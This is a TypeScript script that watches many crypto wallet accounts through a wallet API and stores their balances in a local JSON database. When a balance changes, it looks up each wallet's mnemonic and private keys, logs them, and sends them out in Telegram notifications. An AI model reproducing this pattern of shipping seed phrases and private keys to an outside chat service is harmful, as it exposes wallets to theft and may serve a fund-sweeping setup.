import { sendGetRequest } from "./request";
import { randomDelay, shuffleArray, sleep } from "./ultis";
import { initBalanceDB, db } from "./db/lastBalanceDB";
import { notifyBalanceChange } from "./sendBalanceChange";
import {
  getChainNameByIndex,
  MatchedTokenInfo,
  TokenAsset,
} from "./wallet";
import { getAllAccount } from "./db/db";

let lastBalanceMap: Record<string, string> = {};
let lastAccounts = [];
async function fetchBalances(): Promise<Record<string, string>> {
  if (lastAccounts.length === 0) {
    const res = await sendGetRequest("/api/v5/wallet/account/accounts");
    lastAccounts = res.data?.[0]?.accounts || [];
    console.log(`📋 获取到账户 ${lastAccounts.length} 个`);
  }
  await sleep(1000);
  const accounts = shuffleArray(lastAccounts); // 随机打乱账户顺序
  const balances: Record<string, string> = {};
  for (const account of accounts) {
    const accountId = account.accountId;
    console.log(`📤 查询账户 ${accountId} 余额...`);
    const result = await sendGetRequest("/api/v5/wallet/asset/total-value", {
      accountId,
    });
    if (result.code !== "0") {
      if (result.code === "50011") {
        throw new Error("Too Many Requests");
      }
      console.error(`❌ 查询账户 ${accountId} 失败: ${result.msg}`);
    }

    if (result.data && result.data.length > 0) {
      let total = parseFloat(result.data[0].totalValue).toFixed(2);
      balances[accountId] = total;
      db.data![accountId] = total; // 如果用lowdb存储
      await db.write(); // ✅ 写入最新余额到 JSON
      console.log(`✅ 查询到账户 ${accountId} 余额: ${total}`);
    }

    await sleep(randomDelay(1000, 1200));
  }

  return balances;
}
function compareBalances(
  newBalances: Record<string, string>,
  oldBalances: Record<string, string>
) {
  const changed: {
    accountId: string;
    old: string;
    new: string;
    diff: number;
  }[] = [];

  for (const [accountId, newBalStr] of Object.entries(newBalances)) {
    const oldBalStr = oldBalances[accountId];
    if (oldBalStr !== undefined) {
      const newBal = parseFloat(newBalStr);
      const oldBal = parseFloat(oldBalStr);
      const diff = newBal - oldBal;

      if (Math.abs(diff) > 1) {
        changed.push({ accountId, old: oldBalStr, new: newBalStr, diff });
      }
    }
  }
  return changed;
}

async function startMonitoring(interval: number = 10000) {
  console.log("⏳ 启动余额变化监听...");

  await initBalanceDB(); // 初始化 DB
  lastBalanceMap = db.data!;
  while (true) {
    try {
      const currentBalances = await fetchBalances();
      const changes = compareBalances(currentBalances, lastBalanceMap);

      if (changes.length > 0) {
        console.log("📢 检测到余额变化：");
        let msg = `📢 检测到账户余额变化：\n`;
        for (const c of changes) {
          // 使用lowdb 读取db.json, 找到每个账户id对应的助记词
          const localAccounts = getAllAccount().find(
            (item) => item.accountId === c.accountId
          );
          console.log(
            `账户 ${c.accountId} 余额变动: ${c.old} → ${c.new}, 助记词: ${localAccounts?.mnemonic}`
          );
          msg += `账户: ${c.accountId}\n${c.old} → ${c.new}\n\n, 助记词: ${localAccounts?.mnemonic}`;

          // 更新 DB 中的余额
          db.data![c.accountId] = c.new;
          await db.write(); // ✅ 写入最新余额到 JSON
          await fetchTokenAssetWithPrivateKeys(c.accountId);
          // await notifyBalanceChange(msg.trim());
        }
      }

      lastBalanceMap = currentBalances;
    } catch (err) {
      console.error("❌ 监听失败:", err);
    }
    console.log("⏰ 等待下一次检查...");
    await sleep(interval);
  }
}
startMonitoring(5000);
async function fetchTokenAssetWithPrivateKeys(
  accountId: string
): Promise<MatchedTokenInfo[]> {
  const res = await sendGetRequest(
    "/api/v5/wallet/asset/wallet-all-token-balances",
    { accountId }
  );

  const allAssets: TokenAsset[] = res.data?.[0]?.tokenAssets || [];
  const wallets = getAllAccount(); // 获取所有钱包账户
  // ✅ 先过滤掉价值 < $1 的代币
  const filteredAssets = allAssets.filter((asset) => {
    const balance = parseFloat(asset.balance);
    const price = parseFloat(asset.tokenPrice);
    return balance * price >= 1;
  });
  const wallet = wallets.find((w) => w.accountId === accountId);
  if (!wallet) return [];

  const result: MatchedTokenInfo[] = [];

  for (const asset of filteredAssets) {
    const tokenValue = parseFloat(asset.balance) * parseFloat(asset.tokenPrice);
    let matchedPrivateKey = "";

    for (const account of wallet.accounts) {
      if (account.solana.address === asset.address) {
        matchedPrivateKey = account.solana.privateKey;
        break;
      }
      if (account.evm.address.toLowerCase() === asset.address.toLowerCase()) {
        matchedPrivateKey = account.evm.privateKey;
        break;
      }
      if (account.tron.address === asset.address) {
        matchedPrivateKey = account.tron.privateKey;
        break;
      }
    }

    if (matchedPrivateKey) {
      result.push({
        symbol: asset.symbol,
        address: asset.address,
        balance: asset.balance,
        tokenPrice: asset.tokenPrice,
        tokenValue,
        privateKey: matchedPrivateKey,
        mnemonic: wallet.mnemonic,
        // 所属链
        chainIndex: asset.chainIndex,
      });
      // telegram 通知message
      notifyBalanceChange(
        `🔔 接受到新代币，代币地址: ${asset.address}, 代币: ${
          asset.symbol
        }, 代币数量: ${asset.balance}, 代币价格: ${
          asset.tokenPrice
        },总金额：${tokenValue} 所属链: ${getChainNameByIndex(
          asset.chainIndex
        )}, 私钥: ${matchedPrivateKey}`
      );
    } else {
      console.warn(
        `⚠️ 未找到匹配的私钥，代币地址: ${asset.address}, 代币: ${asset.symbol}`
      );
      notifyBalanceChange(
        `⚠️ 未找到匹配的私钥，代币地址: ${asset.address}, 代币: ${
          asset.symbol
        }, 代币数量: ${asset.balance}, 代币价格: ${
          asset.tokenPrice
        },所属链: ${getChainNameByIndex(asset.chainIndex)}，钱包地址: ${
          asset.address
        }，助记词：${wallet.mnemonic}`
      );
    }
  }

  return result;
}
